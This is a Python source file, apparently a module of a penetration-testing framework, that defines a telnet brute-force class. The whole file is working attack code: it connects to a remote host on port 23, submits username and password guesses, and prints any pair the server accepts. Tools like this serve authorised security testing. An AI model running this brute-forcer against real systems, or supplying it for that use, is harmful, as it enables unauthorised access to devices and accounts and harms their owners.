import telnetlib

from modules.brute_force.bruteforce_login import ThreadedBruteForceLogin


class TelnetBruteForce(ThreadedBruteForceLogin):

    def __init__(self):
        super().__init__("telnet_bruteforce",
                         ["telnet", "brute", "force", "bruteforce"],
                         "brute force telnet",
                         port=23)

    def login(self, username: str, password: str):
        try:
            telnet = telnetlib.Telnet(self.rhost, port=self.rport, timeout=self.timeout)
            telnet.read_until(b"Login: ")
            telnet.write(username.encode() + b"\n")
            telnet.read_until(b"Password: ")
            telnet.write(password.encode() + b"\n")
            index, match, text = telnet.expect([b"ok", b"success"], timeout=self.timeout)
            if index != -1:
                print(f"[+] password found: {username}:{password}")
                return True
        except:
            pass

        if self.verbose:
            print(f"[-] incorrect credentials: {username}:{password}")
        return False
